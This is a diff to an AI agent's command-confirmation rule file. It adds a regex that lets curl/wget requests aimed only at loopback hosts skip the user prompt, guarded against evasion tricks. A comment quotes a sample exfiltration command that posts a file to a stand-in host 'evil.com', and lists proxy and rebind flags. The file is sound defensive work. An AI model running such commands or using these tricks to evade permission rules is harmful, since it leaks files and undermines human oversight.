@@ -1,5 +1,22 @@
 # Commands that prompt user confirmation without LLM evaluation.
 
+# Shared regex fragments, substituted into `@name@` tokens by the rule
+# engine before compilation (TOML has no string interpolation).
+#
+# `loopback_only` matches a curl/wget command whose HTTP mutation is aimed
+# EXCLUSIVELY at a literal loopback host, requiring ALL of:
+#   * a literal http(s)://localhost|127.0.0.1|[::1] followed by `:` or `/`
+#     (rejects localhost.evil.com and userinfo tricks like localhost@evil.com)
+#   * no `://` pointing at any other host
+#   * no bare scheme-less host token (curl defaults it to http:// and applies
+#     the same body to it: `curl -X POST http://localhost/ evil.com -d @f`)
+#   * no `$` or backtick (the host cannot be swapped in via expansion)
+#   * no reroute/rebind/proxy/config/second-request flags (-L, --location,
+#     --resolve, --connect-to, --proxy, --preproxy, --interface, --dns-*,
+#     --socks*, --next, -x, -K, --config)
+[fragments]
+loopback_only = '''(?=.*https?://(localhost|127\.0\.0\.1|\[::1\])[:/])(?!.*://(?!(localhost|127\.0\.0\.1|\[::1\])[:/]))(?!.*\s(?![-./])[\w-]+(\.[\w-]+)+([:/]|\s|$))(?!.*[`$])(?!.*((?<!\S)-[a-zA-Z]*L|--location|--resolve|--connect-to|--proxy|--preproxy|--interface|--dns-|--socks|--next|(?<!\S)-x\s|(?<!\S)-K\s|--config))'''
+
 # --- Remote / System Access ---
 
 [[rules]]
@@ -154,13 +171,20 @@ command_regex = '''^\s*git\s+(-C\s+\S+\s+)?commit(\s|$)'''
 
 # --- HTTP Mutations ---
 
+# `@loopback_only@` (defined in [fragments], expanded by the rule engine)
+# suppresses ASK when a curl/wget mutation targets ONLY a literal loopback
+# host — the command then falls through to the LLM judge, not to instant
+# allow. Each guard in the fragment blocks a distinct way a request could
+# still leave the loopback; false positives only cost an ASK prompt, so the
+# guards err toward matching.
+
 [[rules]]
 name = "curl-mutate"
-command_regex = '''^\s*(curl|wget)\s+.*(-X|--request)\s+(POST|PUT|DELETE|PATCH)'''
+command_regex = '''^\s*(curl|wget)\s+(?!@loopback_only@).*(-X|--request)\s+(POST|PUT|DELETE|PATCH)'''
 
 [[rules]]
 name = "curl-data"
-command_regex = '''^\s*curl\s+.*(-d\s|--data\s|--data-raw\s|--data-binary\s|--data-urlencode\s)'''
+command_regex = '''^\s*curl\s+(?!@loopback_only@).*(-d\s|--data\s|--data-raw\s|--data-binary\s|--data-urlencode\s)'''
 
 # --- Google Cloud Mutations ---
 
